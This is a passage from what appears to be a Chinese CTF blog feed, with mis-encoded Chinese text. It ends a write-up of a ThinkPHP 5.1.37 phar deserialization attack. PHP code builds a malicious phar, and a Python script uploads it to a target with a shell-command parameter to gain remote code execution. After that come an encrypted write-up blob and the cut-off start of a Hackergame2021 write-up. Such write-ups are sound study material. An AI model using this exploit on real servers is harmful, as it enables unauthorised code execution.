invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$w</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;12345&quot;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåç”Ÿæˆpharï¼Œç„¶åæ‰§è¡Œè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read()</span><br><span class="line"></span><br><span class="line">s = urllib.parse.quote(base64.b64encode(s).decode())</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">remote = <span class="string">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class="line">sess =requests.session()</span><br><span class="line">r = sess.post(</span><br><span class="line">    url = <span class="string">f&#x27;http://<span class="subst">&#123;remote&#125;</span>/index.php/index/index/hello&#x27;</span>,</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&#x27;ethan&#x27;</span>:<span class="string">&#x27;&lt;here_is_your_shell_command&gt;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;world&#x27;</span>:<span class="string">f&#x27;hello=<span class="subst">&#123;s&#125;</span>&amp;a=phar://./hello.txt&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>æˆåŠŸRCE</p><hr><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>pharååºåˆ—åŒ–æä¾›äº†ä¸€ç§æ‰©å±•ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢çš„æ–¹å¼ã€å…¥å£ï¼Œæ‰€ä»¥åŸºäºunserialize()å‡½æ•°çš„å„ç±»æ”»å‡»tricksï¼ˆæ¯”å¦‚å¼•ç”¨ç»•è¿‡ä¹‹ç±»çš„ï¼‰ä¾ç„¶é€‚ç”¨ã€‚é‰´äºpharååºåˆ—åŒ–æ¼æ´è®¾è®¡ç‰ˆæœ¬è¾ƒå¤šï¼Œç›¸ä¿¡CTFæ¯”èµ›ä¸­å®ƒä»ç„¶ä¼šç¨³å®šå‡ºåœºã€‚</p><hr><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">Thinkphp-5.1.37-ååºåˆ—åŒ–æ¼æ´</a></p><p><a href="https://www.php.net/manual/zh/class.phar.php">https://www.php.net/manual/zh/class.phar.php</a></p><p><a href="https://blog.csdn.net/lllffg/article/details/116145918">Thinkphp 5.1.37ååºåˆ—åŒ–æ¼æ´</a></p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf">us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It</a></p><p><a href="https://github.dev/php/php-src">https://github.dev/php/php-src</a></p><p><a href="https://www.webhek.com/post/packaging-your-php-apps-with-phar.html">packaging-your-php-apps-with-phar</a></p><p><a href="https://www.freebuf.com/articles/web/205943.html">PHARååºåˆ—åŒ–æ‹“å±•æ“ä½œæ€»ç»“</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Phar </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp æ—¥å“­school-bus ä¸Šäº†é‚£ä¸ªwriteup</title>
      <link href="/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/"/>
      <url>/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/</url>
      
        <content type="html"><![CDATA[<p>å¯†é’¥è¯·æ‰¾æœ¬äººç´¢å–^_^<br>AES CBC Zero padding 128bits&#x2F;block IV&#x3D;0  UTF-8<br>qboAHUOHL+uw94b2elojCJWHWKwqPtIwFzSDKPZqmHPSu0APpp7H0ibcQNIUgrwDCCwdydqP+T74+slwNh6PM4GTvT1CoF2thGIZi5yCS9HfleGi5hP58rxFM3HzQxaU9EcxOEYbtGObactrCOzKP&#x2F;+tPittHwWWiL5uEQyt8ESrZlgr19O5mtM4zrkRoODCUtcna5XWuatk94T60ToF6ZrhqTb5v60dcwGjw3Zf1xaBRvYR2HltlogOzs&#x2F;QoLrDm&#x2F;gzGqxvddGPCaOEkF5nCzk4un7sl6RJD77GVxRA4IqYMSExrw&#x2F;By3bqLJyL+3waQihC4E3teqyknbLGbYCtF5VKV32WmE8H0hEyP0KkpO6MTJBiz4mziI3M0+pmoTXIRiBSpISAGq7RbKMIs2cOFD7Baxx+vUXuCShr7ZExYTi3bHD3r435&#x2F;F4WXA9NuFaNM5Lhu+rmFBRobYZ2Ur3BBIFDlTT6gI5XXgoVj9qhHx5DJWFlGcglkgefiabVxUmTFFohZPLnpJxGJByTi6Frw+epqfZkrY0eGTMPIBKcwQDqh1DnPDyxm+64Xr5fffzpmG&#x2F;HNyq8Nsa1qpk8Yw+Vu4l03oDZ9CX0msubse852dj0ySNKgYXSOKnYet8jdjSC2eVd14nypMuok1BPUoHMv4rlme813n&#x2F;lE8LehT5xRF8R+HFyxfsRb354Xr39YX5DpI61tS41P1A+IiXbWvGG7kUk7Ln4mV+UJe6FEWzNzD5f0o3thGCoYd7ccyUrVJTbFsnbz7wuCmWS9dFkx3QAOxkGcbgyPh9NtbkcfKYa&#x2F;znW6GibzQf3NQZ2W4jQl&#x2F;wEtVPMs1BzweyAI3XGoJy7ZdHrvrswzdSq9rrcJLYW8TLG4lCowCRwb0gx1d9RptT4Tnj15poEl3zW66+L9dSb6RxTgsWrh0MM20xHmLmAEkoVG5QtGpZjQUIiKrq2BDahZtKWQayM1c+x8PtdZysfGYxyW+nzq&#x2F;frGKmEKwo8GMqiLwevXk1aLryVVf57ofS56w+cyYAwmJtJ3ZKyeV26k4+WkV7EHBrTbItrz8EG8uP1eTzz922bAOhdWVck80iAc2QeolUYa6Ohp4GPP0tN2Q+CtBuPgjaPERjt42ZfhmstjJ9OoOiFObtUH72Rvg0i8aK+NsaSM48jxxuCJ8atXf57uu6giunfmaGaQ8fbdd395Sq7mTbvUiTVEn9tQX23xYfKcpnHSPMGfdcmeL5LdYg153QHLRLJ79&#x2F;vFbTKt6iLLbcImzlNgs70xE78rKHG3YFrrGwd41&#x2F;DSOxLqHYE5tiHkb32Haoy+&#x2F;d6NAAzahYrhx2x28DVDmJbotGIEjpCw4hvWSwAkT3toy0aRE5XpVpzzqXqxaSTteM+Vifzr&#x2F;+zynUM7SUwbMvONbqyhqC6tKtYtEOFoknu80e20Id7Ja9nfWH8s0Z7iWeb0p&#x2F;8i5yHvZVuuYFnDkcOz1z7VGmi6B7W2KTp9BWcjTupzxH+pnoGV+hMUHFiBoYrZJzt5bFpvOzEYJDHhq4oh8jxZMeKADJBwDfoNFaBeN2tVS93HJ1tT18YwI4BsxiDjBuX351JfepxVrP0d0DNlT&#x2F;rYgCyeXzIiz244JReySuLe6mALcEg0htTn7oZt6yONG1LVq8mfQ6GXrSqIaeBbNrfP3FF7C+7Vri45CvV39Rnt9y2r3eKdOW2VGf+8XZ8JBWKwpT65u1lKxim+FDxxmqxY1nStKtm3v6K5FtcsBz3LmNBJPB9oaILV10XWIPVVOpgD4MwV4XFT&#x2F;vpgoVhL0Det0atbj1KBG8A0dhLZwcWx72l&#x2F;yuAoCLuMoXciNPsVmngkkuCFVEziPxgPqVfPQTbGQbk4raRfOkCbkK5nAS4MTeEfr61fvQwYVXPYRTXDx1DWbTUABHbG0e5f8OG7fKNpC8c8m94sZM6osTLAdus73OC5Lj&#x2F;iHsOYgjfkW1KRnL7W5b2UOdNgUVyQueSNBmQEw4sW9J5+LWYd4NRE0qL8TLrjhL26u6L6RBVMEJomjcAQnOBGIiBVl4jSAgt1HcpnDn7JyV95Th5pPEJ7YGtgLkBkuvIpiIW9sGLwWJsWkJwQXyFTSxMaJeaxyz6q725nxYXrIXIq7uGUJrDaN60GNnwgL&#x2F;swzqqlmF0gdorXScCHc06roB+27rYV3kEEguhmsyoyxHdX4J33BEXeqigi3JaTrsVafApgIKZYhN&#x2F;uH5UKHgZ4Xr8Qq&#x2F;aTVcnv8ovm6jwTZRnQFCZaPKQ995TL5Rfm8gF4ejv32i2g&#x2F;0F1bxwJ3sqYCEo4cDtsWXeAY9pidVji6BHZ25oSuiYb2G7TBpfoo26Ey8e4l5zM0KRgeBmk6g3iXILfY6DH71fjzptJ+H4I5anThAZMycGTkr7UzknBxCluU98JK4WQnU3klY4E4ZZbHrYGmO3UwRxEzyqfFVB4JFSDbuWy4OJzmDCX+LFMAD5PfOKIDAIQ1Skm6j&#x2F;UqPXoVIZelOk0A57WCZ+&#x2F;eP0O5fpc1JhtkPkvfr7yQjFIHtRbJb2toReQxHtLvrFhAyBvC28xxI63fX&#x2F;C1At2u3agpy4KnUzAwdVAUVq9f2DjxTkrh3btk83i8aLG2QQvg6DCr7KB9Tw4exkc6MMxtjtpbwgZx0dLsh&#x2F;SyYBTRs+LgsfsBLVg5FhviLay+47uuXl6CQBZHQXcBl8LmRxOrYsHQnkgQ1qBpl7uJO5ru1rTMdbDP4+TSoxNcUEFZcHal0Baz4Srikc447dhDkvPtnEdIdxJEN5xnbHqd0EsE1f3Dn2vQLcQ7BeYWWUGLCdLte95y6EdYvL1r96Ggqv6izkQ&#x2F;aImw5Hif5KPuGt1Og8GPPlywv8wIDpi&#x2F;7V2Xw1FCOuJXSQRJjoKow87AcpKmmjKEHew0QdI6cOEBDwZki5bjFA9j6LW3NckoFOu7QTaA5alDsTWKJMnwHEN6Mn3IfoPVs7bqM9q6sPmDyoVUd8AjgA2iYkaJlS8TcXqWLl7z&#x2F;4F5GjmmV7a9hcY&#x2F;ClYN7zhagdUaFakLKkw0ngzsjZP45&#x2F;Hn0HWUfDH7NaLLovWi&#x2F;wKXYqrrMZkvKqVDhSD4U57zKCS05tBg0jqoW2digZPvzHJHDq2UV5o&#x2F;9MaIyTPgzU7JhUTrKOD+HzX3ZYvsFrmUfx9eiCVK57OkxfDGrzmVCgjX9ZIn2r0UzEbI1mfjHq75DiES38S2g67ypcnjnX4&#x2F;o2qmHI9GR7xzsB70Ol96WGcoOvYn2v6&#x2F;ldWx8dGOBRiTXUWve4jgtdCWupi4O8AikIhktX8sTJ+VBEhNr9negjA+FQj3y1xaPYl4LTyzpgiaeIDBUZnyt8Lgl&#x2F;fi&#x2F;Nm12nQDhE2vEJ3R2cjciLWG50b6U+9r94bS0nzbY0uupbI+fep8DE7ty4NHo0TtFF&#x2F;58f49MEj7c56AWzLGanI+OnYqYJ7w5tCbhY4V01jYYwEX6Ur0GWOZvsmOeR1kCSMLVWRcNipjOBr8LA9JeTfVr0WPyvl4rBD0RJ2ITrP3jn85iHVYMUCmTiXaav6poh1+WCPYM2J9q4bdwK1TBxX2vBCv33t&#x2F;e6wABwqh5wsy1APhgzL1ZTZrSsnCNfnPXbJXtWCaexkYF58gRZ3+I2XZgYvmj37TT53qhayl7sNImuGLFWuWVH0um+ldqP1u0joF+&#x2F;BiJTD1gbgtSE+HW3r+Ntd5OgQBbXHhy54d4ABucD7RqFS95GlwadZV6v4AjJFKFYh1rnDZHKVDT9Ux301iTmwFvPatYPwCyJAmJ4bndBzhmwDl&#x2F;yU8KFuZ8zbA8yUr5nrtSu9A&#x2F;I6rsRtMdKQTJMRZ4iL5s1zmZTzPVF1&#x2F;VOoqIVLP8kDtuyyxVXGUcufl6nIHCYoQlbvvXQV3TWIlnut2uWxuedeTuOS3vQj1JDnmkEnc&#x2F;BmjeY2zGFgxtDpTjwW&#x2F;Eh9SFJq9ZctkGkPdwrXCXr+DThhguEGXS7fGJeScW5fN0&#x2F;u1w&#x2F;V4c4VW9&#x2F;GNDBZRuG6AyUjEjVABlBj4fER+2vhhzgnzhTnh+j5qNpMFy7Jhd0gmLgdywSUTrK2U96l9tcZYnIMOnLlAzinaqDauE9KigK+x4tWxEW9LMmfCsmV72BRaIpx8xrrmvaF0DYLKCqxvY3SdCU3YIxA6iIMhShTN15M6znJzq8kufcm6FJ+iO6bzDnDLSwdUteGfQCgHKAK4S&#x2F;NPsChjP5OB&#x2F;qWZsq1KCFTUh1+04E+F2oHfwMUitqLV1blL4KPUeImUx0ldbeXHtEMxHwWX9CQbU2Ksd9iyCB9oye4ANR5FDpYJBC5Yvb9SAMW18zT99I2FfS6S5umUDm&#x2F;uTR0V3fAjWMDwwjhuWH9YZRqOADr9UXNHdJn5M4MagfplbfBdWWiU0Waxc+14EZkX0&#x2F;62UKO5YyZzkHrv2X0jckDbGFuG29fY6PJOnmY+UN6JhOJ52OfrjR4KIrp2SORgHzEUqD6YzF8zhmBsMZ8AY9&#x2F;GMAGLbV1zhbuIls5FzIX1JdeJNzEUt31nIz5rEfhgXQa5eHFUqxrE7xZTzajOG0e&#x2F;CF&#x2F;xJeTt85iii40wTADQ875fgxnR6hBbqVGb6PVKekN&#x2F;1CNbCyqyp&#x2F;NbS8rS5Q+49NVtF8anddxlb6PkliqxlKlrBUmQKDT1d5tgkEeyNj8cBS4Ve3bJG4Pd526iqqmyW8y&#x2F;EiGLa6RwVe9VmUB2qp&#x2F;4GlWqZ&#x2F;tb4Z5T4KkXvpEv6MtV5+DHyjqlDNSmYcFL9N8Zk31TyVckkMWxcrvYZ+gZnCGqiQQPmCXhYfGlaMDkBhAZNSBZwX0c1fyKNCu7wA2D29l&#x2F;NquX2VfowrYAExOVlh6Gpa0O0BlyqCJYwI0lnaPpqhnhaDO6mTiokYuWOiQnSrVRBGHk2cxLKt0VH&#x2F;hL92mWc13+AmEemKcOJJaj9RRAWZ0t3H7WjgMhJgR26xJufcfES74EM1FEta1s8vboiDfcTOwXCdUInCnV0Pq2atGpq4oCxuM8YdlR+iopxMehFm&#x2F;FdR5tedsLN87jJIEC&#x2F;CJcWYLF3wE4lt9NOJk10ZHRxSgLS6&#x2F;42fGTFx+chZaN7JxAFhKPttpz3PG038aclzC7G&#x2F;fR0wUXnoi0U2Aide+DZfRWLn05rPDMRuodYTLet&#x2F;4GdbIgdGOqa0LReMei3+g8Ej+h2s0qRxb5fyixwjwCO1HDny5tK4Y3iG&#x2F;KbGXo0vsMymGcAQNphEn94EHk6oaBlHRbgtcwWOEqMlSLLyI5z3OqmoxK6WLj0Kw9g3YiSFSYhCNwa9gw9032cRSLxWDhGGBSF5T9wmjn2J7y4jgg1qrlQa1oTJ+Ep1jBsTQKJIds+E&#x2F;+XK3&#x2F;dCQLIBWkcQFGXblOkukLR&#x2F;uhCdMhhLcbsz1GqYI&#x2F;29K7A6uj+zm8Ep&#x2F;uLgpBQFrxFuIUYFQ4&#x2F;1OO&#x2F;ZkuscEGirPyeDkVeRHVjCt6JFCWUFC0X6ZNtbmSyD51BFNmv+gJroUxhddlWDADjDWI63N7tTWIPJ5mkv9VRM5WGZFrxSIiIZ9M4PXNTErzxRB3008xdtbUrKqlBuoPWsRK4Cea4IdiOyyISAtallenfMlWGvNV1FNzKY1CliJRLtEErg+5UurywxwuMDerKcMx5c&#x2F;+3MoCtFTCLOp3JI8uL6M2qWbSuRFd1Q6PEEH&#x2F;QUTHtmxopXhztQ5zoclhcKKugfxhz1iQLVRohWD&#x2F;xnbjahebmp9pV836wIjebrltKo31KpluhberLabcbIBtGAqtT6BtadXtcwPX5ensTQNN7U6xPE4IAREcClVchuzQGalwss2s1si9D64RHkqX97txTJQ3Yk7xuGa+OmPCNPCGGadbEKbrhIPpCI&#x2F;3ryILqToozUfDjXQrzl3rvNyxAy9pwtcWj1iBGFN&#x2F;8JBkCBi0B+IspyFYk65RkOfiXE6X1I6IjjYyAUszYInPfOeY8RKrSnuxBj401BlRljYkTALlITzxAzVBytpxQwP4Ofhj1Gty8JVBdsveNvA2M6fw524lGFOadqThTqdP330aqL1HrJhhw&#x2F;cZo+wAYmvo9dgrbDLlK8yDyLtBhRmCQAnwf&#x2F;CtdVK3bqAlw2xr2S0tBNIq5dC&#x2F;9QU+yiJSJlf57Ui186BnzLNLmfkpWxU5oW3RnWXaM21bqNvrarqnqEKxcQiTTP6Le1BDhuoceKzzB7rPlMjPO6GUXO3pFaZfMgwwPmNBvFEnCEsLngzjObiJARrEmtV&#x2F;I5RRTUXMAwCK5ookoSFfFVfqTih36sJOaBCCDR+TEkQ3zQE2ZvV35OTb586cPbvp0B3Vd+RRnF79Z4+56etRg38pDY9EEFj&#x2F;&#x2F;trgxQ&#x2F;QkYclWHqeUWm5pKhFZ+g2qLMlVs1K0q8d6sSsvt0R7iuDZtNZZLd9D&#x2F;lxyz7rkGT7DpqTpOjvRZqG+VGquYaLFId+xE6nqPM8CEWz1&#x2F;NT8691a6XX7qCdWSm78nmrZ&#x2F;IX4IGGc5LZBLo8j9sf9lXqGNqSYKOjdkEIKswoYTfxRk4y4&#x2F;cWo9f5nIbP+Vaw2bjZ5WKespE4CTAOxpk7DHXxh5wzYPld6NqjdYiaz1+DbLWVSIeRfX0h+bbsFal6+gDJ8hM5bHc5xrlim+nCloZXuBhEsd9ZEEIiGdew&#x2F;l72jCnlfZH&#x2F;tfxshLOAvJY86uGsytRp3UkGtDmnloRtJJ4lYB3aoIgcuQSt9NzyqU&#x2F;sK8ivilobtO3s9+iDykFnLmtpI&#x2F;c&#x2F;wZMQ6na0GuyohYe397yya9UosBdt5jhumBxntnIPVeqKCdavin&#x2F;P5AGbWo8LowD2pGyD0pHR9ptBYDuuIv4&#x2F;tBuskdK3HQHPCOGIFj8Syqc9LG29IwtySpz&#x2F;AkBEIg+81UJ5V+b5r7&#x2F;jjlepp8ow049YyDcKzNP8HGAhfmYtEPb0zZKcd7ZyGYhID9RfUwHrPRSdSFuGDZhiBYhdrI2lpXaUgsbpho+CjUp74Dl6pl2RX+YNZSbl3P4wVfNBMlmOHWqJ8UEctbb&#x2F;DVoSjs3C0kptMRBbBSwK8uUi9AR+Y17Ruti5Li7Hcc4iQ7FDJ7wnkAXD3KSGZ&#x2F;OEvM1ghAazhRMeKANiZ&#x2F;CGSidJwBq+PdF3RbqsshaWWjVi6oq9JktiCI78yJuZ+funSupw&#x2F;M0YXKyiuXD6ZrxMcG5PjTWb&#x2F;FH5XR2QtUTSwq&#x2F;z1yYnhXTjtMjP6kex7yda58C&#x2F;QD+0YBdKhyMxuwSzOixS5ryofQ5cavR&#x2F;4zOBtxmDewhTSII+eLpgqFMdzZFnG7Bk4ot1AHPCOxA1bdEn3IzH9GQ7NMo3G4kskakXZC3K5QHcsgUr+&#x2F;8k8fY79Utp&#x2F;3sq&#x2F;MqTgeml7NAau0jhkGbMANcr4jZj3N4tBsmo&#x2F;InMiI7+H7k1fDa32BrzdoevMfJYA3PaDHFRFuoeDlWAnxAAyk11kKjnidwQ&#x2F;rBqIzrdIBMAfyfbrA55Q47SBe7fwVrzFRBPKtjICzBPKzlIU5&#x2F;xIfDo3IpEY8h6emLxN3dLLLuIBoCtm7MqkB9MA7hzlEwkGPY0oUwtH323Y43Y69s1ldtzi+J+tVbCJrz2y1VVo1sLtoRgxkTqjqCtJpOi2Q7JLLX1433EQ8tywYvxCjuBH4N8GVPsUCuZFVpUZ7kQEfpCCmRnyyIE8myFbHHKBqq369PP49Pv6OzpkbHJ2ZictG9Yoi85ahlyqbnSacOAIfRBnruBBqo4KwTbAgbesupr0cCPEEMfb0pdyhFFC91RfG0H0ASsdfZk66Jfd2TCjagq8&#x2F;CKoCP2Vi+GLsV3du38v9uELTX3j3gxskoyDeb020ElGDk3L0rl2fIh8fa68knJSWs2z17N09NtGlNLzdbCu9AXBtq+bdxEOZXWk8u1o+YlFRFjphBNf9eMM3itN1&#x2F;5wv2A3e++qsB3t3ZCyaz7ltIdzmy5us9lgNIo4h4ZYpHyUeuQbAqqb40v2w+0g1e&#x2F;+9jtQJfZM+T+LEs16v8UQMB2Pr5Ug4lULpuYga76cbN&#x2F;zebqqe5ABGYWEIBFM+bxLvNv6c3v0VREhA1QvSEqLeYR6OV15tOIzjpJf4dGP6URUYyIz1UlJkEQZSjUFCq2H76YOtieydin+5wXwB&#x2F;s+jicn09aE6B3OYtp2CDBsDOdTtoOOzfz85Ee1dLhL9ogTrbaxkF0w8HRyACovRiag31U05liMpzg1CMVrDQo5qRUAdcNyJEXkSPbY88iZ75h&#x2F;+9N8JhSeJQzxrhl5nhlR9jct9H0RP8fGdt1EGlHCMsxGRVmRBAxykf2bt5N6qnN6&#x2F;Sjdfi0oPDxWdi3Y9M9ZWxgbqt5Tg&#x2F;UW6v9EGe0+hA8Ii&#x2F;Bq5Idw&#x2F;gFR5jlnTwKdB58apXtbtaYnyU3T7dAWwtZ4OvIfv7&#x2F;gpPbeyS1TqY71Gib1CW&#x2F;lWfIO&#x2F;0H98bOHPDIl8Ut3fi5xQG0yqHgQS165tTf2xo1i1sqD6tNDhCIDu&#x2F;1uefrNO3ExZh3Ea9Ac3428&#x2F;GWPVHlg4sqLKlZPds5NfKh0df+VPT3OLPLCH55NQXFtqwE&#x2F;ZsCguOl42vTcKWrkXl71Gp+X5x+mdAu+H1KNhU3f6p&#x2F;5sXiLyWT+T7h4SGvyOeBLUwJer4tFpByMATG560KhAuixXyzXwv8j70CyJp8s399T+N8eQhAxhXVBxgWdtl6Eu+rBPWbHmZXEH1&#x2F;mghBG+RFwuCh4jNPDeQDOBewYrmimmbpmFt1Iqz&#x2F;fuI5eSH8zQLMuzPKYhEG4p+5kPdBQkQz4NWzlrQ0yE2pXBvPNPngsljuC3pAVjRrUVb7MZtuO3BXPeDSb+EXgylh5rBmG7bkk43bdQ4TQyNs&#x2F;FYt7cQ7tFzBQUhWoIDNWKiEs0hThjLY4Aw9zFxuF3Uf9H+fU7GlwZBrsU+QdPR0vKxB5EeyHUamO&#x2F;NYRd5RtFNym4HhMqSEoTQPqLv79hzNyMyMvbrkOly&#x2F;nIwAyXmBmaVTVwVZr1fT+zXgzQL+VY5ByLjJrDw4ghbk67RGlX0qTyXV4mXY41j+0YZioIDBDJHP7D8QHrhQpzOzhMyxkQ7WvTLWEaZqbvGSXN619WL1j9XZOecnOAZazEm0BawPD9vVCMar6VD01ZKHIQVY6+EmdhaWr9j4afovGGPIeFaLzg1YwA6czDMdWH0pbZmV539qrs+sX+toGO5fXI7buTnjvcbi85wKSPj1xlvSIVYD05WH9EX2S8IsJrdLqxVlG4IQj4TIzUpbKxuChuNjDQO0idakciMB9Mkg7ZEolOltVBvZWv47UhoMZHfECUqQARpkRfl8B3YW37L1ihQC1HVpGSI9EiqCLd6ZD0cjg6+E1JK3yDZ3pr0or57JCMX2U0Lf3G3zDiZ9E+kit5C4HsNPCA4Xq9qLcEnSTbUrwR&#x2F;+Ol6DndvqxVSUjYEJCrmqp&#x2F;Fi1CY2XgCle5ojZ9IAWjrbg01FGZMCi3iiSfILVNcl8q4ZZFLweZbi+TivrAC+zRX8cpdCBSMrdC5pCMsIPvzRLJNm+jY32VdintOlE4xMHTk9rr2uNKJ4hQKJREyoz7XCYJrlo9LYIcS2o9lKo3xjSkpnC0SFtg0Sy&#x2F;pcpZw8wyOO2hTXOTmKzyOlw7VH1LtxTB14XoT95Y7euHiB&#x2F;11oz+6uOb3uRm4iql1s+tXka5CfeFhSt9xk3k4S91VDa7f3akOPDdxCQ701qVjM5&#x2F;aat2ARuoYfoghi1AwKpuWYchdLoYSrOiXX91SeH4gOR5UP8KXg2TnNOTvpHN5LRBKm58rMDe7ZmZCNM4AnubKNBP&#x2F;X8UNMaIokp3+I6KpH0c3jmTnSHnLwoi5oqfNx&#x2F;qT2K7ePGq3nqfTkCDqWKSWTe+QG6BsOXetF9mSKh8lPJbru3DfzZ6ICHsZIpfy8Vcfks5Hk+LT44&#x2F;jwWR9xz0B&#x2F;ia2bB6mG7X5Wo5AfbIFSVtrwYmm&#x2F;bx5Mib9QOK1U2X9zav7ObfFmMpENUCxEi1tr+bVQt&#x2F;iubPbpFZ6DNce8msWvzHhhV+81gn&#x2F;QQ3YW+yq&#x2F;Sm5CTP9pMfI72Mt6XCYtr1a6b&#x2F;vWaKnBKOL7dS7w5ORYbH9GlxhtEv4s5wdh+uqDjIZJp4jTt8ysEikkyJg8vj60Ymgd4Q6GEytoArUF7MfNB&#x2F;hYcgcCEOiOcVTRWL&#x2F;sLMDeaSklA1i9tVBUP95ROYnHIR4qoKdqBsEAbGBfjnNMiSwqp&#x2F;pdZIvF0LtjzRxgD5&#x2F;BOvxZtq9zpu8WTP+InLqLtMkXXffeNwM7fKFvfb3RNQfXMPa8wNMLD80D3NyeVEJBZ3AZzhEKaruVZMfhbS&#x2F;Nmcec9GF2nWQm2L8+qLxWbi0OM1lXBuCvMZ5DU8u5tr12a&#x2F;vTwM0CP4gZ0ga9TSNVb2vfJdtHDuC9BSlTB7KcA&#x2F;&#x2F;xvozzLKhfZEUQvmOoyxtzthFSf&#x2F;b3KhAUgu5GzrMSPPiEGNFIWbqm0UF9j5GStLEXm9fOuFvefZw5mH5q0zoIr4cbLFjRjE67EkG0riIEpGjoSG5c3GTsALEhfkv2VpxhSbtucDmKnftpHxYZQcJ+Atg9MnlcZ2mLE2wi8TqJ&#x2F;Y8ODehHR6ocioUPGxZJblrquxAjAARnsqNZ1eIJIO2vOH83HUg0zGhfq4ag4DEEwIxczSRqNnMSuSta+O80zpla9CVaDwcLUG7KMyu0pTrwSLtuGgSa14iE+SQza7jIJs8PTwwRMb7N89oOaXs3QWsmlSybak0pgJ+pZLCiPQYHgD91kaTCRDOOz2sX1F4FSe4OP8ehuEH5vVhcg2&#x2F;FRn0w5AfPRhz30XstZkZrJzYWLNLcB1uPC1bR5YD44AgaRPWQQmLdkmRj8ea5siGd3aDEPDAfNUUatAzwBsfZKZUis2P5LbAJpTjbxbQ9&#x2F;Y8b9aqafukEV3Vs23IEyTx4uRWGUqbpP&#x2F;e9vr6gFGcjM80TkKrsoiG6CuySRQUnUPGAmco8TZwI1ETwthdL5Xh2D82vI1Q93Lh1n194uCSLKPbVIFgxONJIKyIJFfAU&#x2F;kP9Beqb+oLoBulIbDeechaTNfe8RrzZM&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write-Up </tag>
            
            <tag> SchoolBus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackergame2021 éƒ¨åˆ†WriteUp</title>
      <link href="/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/"/>
      <url>/2021/10/30/Hackergame2021%20%E9%83%A8%E5%88%86WriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="yyyã®WriteUp"><a href="#yyyã®WriteUp" class="headerlink" title="yyyã®WriteUp"></a>yyyã®WriteUp</h1><hr><h2 id="ä¸€ç‚¹ç¢ç¢å¿µ"><a href="#ä¸€ç‚¹ç¢ç¢å¿µ" class="headerlink" title="ä¸€ç‚¹ç¢ç¢å¿µ"></a>ä¸€ç‚¹ç¢ç¢å¿µ</h2><p>è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€æ¬¡Hackergame&#x2F;CTFæ¯”èµ›ï¼Œæ„Ÿè§‰å¾ˆæœ‰æ„æ€ã€‚å‰å‡ å¤©å¿ƒæ€æœ‰ç‚¹å´©ï¼Œå¥½åœ¨è°ƒæ•´è¿‡æ¥äº†ã€‚å¤§å®¶è¿˜æ˜¯è¦æŠŠHackergameå½“åšgameã€‚æœ€å¼€å¿ƒçš„æ˜¯è®¤è¯†äº†å¥½å¤šå¤§ä½¬ï¼ŒæŠ±å¤§è…¿.jpg  </p><p><img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030161203937-1693462675.png"></p><p>å¯¹è‡ªå·±çš„åæ§½ï¼šEasyRSAå·®ç‚¹åšå‡ºæ¥ï¼Œæ‰©å±•æ¬§å‡ 